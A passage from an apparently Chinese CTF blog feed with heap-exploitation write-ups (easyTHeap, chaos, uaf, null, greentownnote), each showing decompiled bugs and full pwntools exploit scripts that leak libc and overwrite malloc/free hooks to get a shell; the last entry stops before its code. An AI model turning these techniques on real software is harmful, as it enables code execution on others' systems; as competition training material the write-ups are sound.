<h1 id="Tcache-Attack中的tcache-perthread-struct"><a href="#Tcache-Attack中的tcache-perthread-struct" class="headerlink" title="Tcache Attack中的tcache_perthread_struct"></a>Tcache Attack中的tcache_perthread_struct</h1><p>参考资料：<br><a href="https://www.cnblogs.com/Theffth-blog/p/12790720.html">https://www.cnblogs.com/Theffth-blog/p/12790720.html</a><br><a href="https://blog.csdn.net/weixin_43833642/article/details/107166551">https://blog.csdn.net/weixin_43833642/article/details/107166551</a><br>题目来源：BUUCTF-[V&amp;N2020 公开赛]easyTHeap<br>附件：<br>链接:<a href="https://pan.baidu.com/s/1T1pV_mbUEPXCg-vlu_Yw7w">https://pan.baidu.com/s/1T1pV_mbUEPXCg-vlu_Yw7w</a> 密码: 5fnk<br>–来自百度网盘超级会员V3的分享</p>
<p>chunk大小小于0x100</p>
<p>UAF漏洞double free 泄露heap改tcache得到unsortedbin泄露libc直接随便玩</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;, 25389)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print hex(heap_base)</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>, p64(heap_base - <span class="number">0x250</span>))</span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="comment">#print hex(libc_base)</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">one_gadget=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">2</span>]</span><br><span class="line">new(<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span> +  p64(malloc_hook - <span class="number">0x13</span>))</span><br><span class="line">new(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x13</span> - <span class="number">0x8</span>) + p64(one) + p64(realloc + <span class="number">8</span>))</span><br><span class="line">new(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>天翼杯</title>
    <url>/2021/09/28/%E5%A4%A9%E7%BF%BC%E6%9D%AF/</url>
    <content><![CDATA[<p>我是废物！！！！（超大声）</p>
<span id="more"></span>

<h1 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h1><p>逆向分析，看exit code来判断哪一步没有通过检测就可以得到正确的菜单选择指令</p>
<p>这个题的漏洞在于如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> v4 = qword_202050;</span><br><span class="line">  qword_202050 = (__int64)buf;</span><br><span class="line">  buf[<span class="number">65</span>] = v4;</span><br><span class="line">*((_DWORD *)buf + <span class="number">128</span>) = v2;</span><br></pre></td></tr></table></figure>

<p>size位在buf+128的地方，这里就出现大问题了</p>
<p> 如果一个堆大小科员覆盖到buf+128的地方并且修改其size那么就可以无限输入了，直接造成堆溢出。</p>
<p>还有个问题在于他的show用的是puts，由于上面的代码我们不难看出是一个类似循环链表，那么当我申请chunk大小为0x208</p>
<p>（buf[65],一个元素大小为8,65*8=0x208）那么show的时候直接就会吐出来在heaparry上的那个堆的地址，同理泄露libc_base</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64,u64,p32,u32,p8</span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./chall&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./chos&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;8.134.37.86&quot;,28542)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;passwd:Cr4at3 \nopcode:1\n&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;passwd:D3l4te \nopcode:4\n&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;passwd:Ed1t \nopcode:3\n&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;passwd:SH0w \nopcode:2\n&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">junk</span>):</span></span><br><span class="line"><span class="comment">#	 io.recvuntil(junk)</span></span><br><span class="line"><span class="comment"># 	 leak = u64(io.recv(6).ljust(8,b&#x27;00))</span></span><br><span class="line">     leak = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">     info(<span class="string">&#x27;leak:&#x27;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">     <span class="keyword">return</span> leak</span><br><span class="line">create(<span class="number">0x108</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	create(<span class="number">0x208</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x208</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x208</span>)</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_addr:&quot;</span>,<span class="built_in">hex</span>(heap_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	create(<span class="number">0x208</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">	create(<span class="number">0x208</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">leak_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak_addr:&quot;</span>,<span class="built_in">hex</span>(leak_addr)</span><br><span class="line">libc_base = leak_addr - (<span class="number">0x7ffff7dcdeb0</span>-<span class="number">0x7ffff79e2000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;free_hook:&quot;</span>,<span class="built_in">hex</span>(free_hook)</span><br><span class="line">onegadget = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x208</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x208</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#1-&gt;2</span></span><br><span class="line">create(<span class="number">0x208</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#0-&gt;1</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x208</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#2-&gt;0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x208</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x208</span>+p64(heap_addr-<span class="number">0x9e0</span>)+p64(<span class="number">0x220</span>)+p64(<span class="number">0x221</span>)+p64(free_hook)+p8(<span class="number">0x73</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">create(<span class="number">0x208</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">0x208</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+onegadget[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>绿城杯pwn1-3</title>
    <url>/2021/09/30/%E7%BB%BF%E5%9F%8E%E6%9D%AFpwn1-3/</url>
    <content><![CDATA[<p>=-=，不想评价这次的绿城，打过的话懂得都懂yue</p>
<span id="more"></span>

<h1 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __fastcall sub_AC5(__int64 a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  if ( *(_QWORD *)(8LL * a2 + a1) )</span><br><span class="line">    free(*(void **)(8LL * a2 + a1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>=-=uaf泄露libc直接打malloc</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))	</span><br><span class="line">	p.sendafter(<span class="string">&quot;&gt;&quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./uaf_pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;82.157.5.28&quot;,50702)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">chunk_list = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;chunk_list:&quot;</span>,<span class="built_in">hex</span>(chunk_list)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak_addr:&quot;</span>,<span class="built_in">hex</span>(leak_addr)</span><br><span class="line">libc_base = leak_addr - (<span class="number">0x7ffff7dd1b78</span>-<span class="number">0x7ffff7a0d000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_hook:&quot;</span>,<span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">	add(<span class="number">0x68</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x68</span>)	<span class="comment">#9</span></span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+<span class="number">0x4527a</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="null"><a href="#null" class="headerlink" title="null"></a>null</h1><p>off by one漏洞，直接当off bu null打就完事了，构造chunk overlap控制指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">read_input</span><span class="params">(<span class="keyword">void</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = read(<span class="number">0</span>, a1, a2 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Heap :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;?:&quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;?:&quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./null_pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;82.157.5.28&quot;,50804)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#protect</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak_addr:&quot;</span>,<span class="built_in">hex</span>(leak_addr)</span><br><span class="line">libc_base = leak_addr - (<span class="number">0x7fc7c3689b78</span>-<span class="number">0x7fc7c32c5000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_hook:&quot;</span>,<span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x170</span>)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+<span class="number">0xf1247</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">9</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Heap :&quot;</span>,<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="greentownnote"><a href="#greentownnote" class="headerlink" title="greentownnote"></a>greentownnote</h1><p>什么牛马缝合怪。。。。无聊题 uaf 问题开了沙盒，通用打法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_D19</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;| Index :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_20203C )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  qword_202040 = (__int64)&amp;unk_202060 + <span class="number">16</span> * v1;</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(qword_202040 + <span class="number">8</span>));</span><br><span class="line">  *(_DWORD *)qword_202040 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| Success&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看见对free的idx没做检测的都不确认下heaparry是不是有东西的</p>
<p>直接double free 他的2.27是很老的那种直接double 就行了，我的本机2.29笑死。</p>
<p>double控制free_hook写入setcontext+53再去传入mprotect的构造就行了</p>
<p>exp</p>
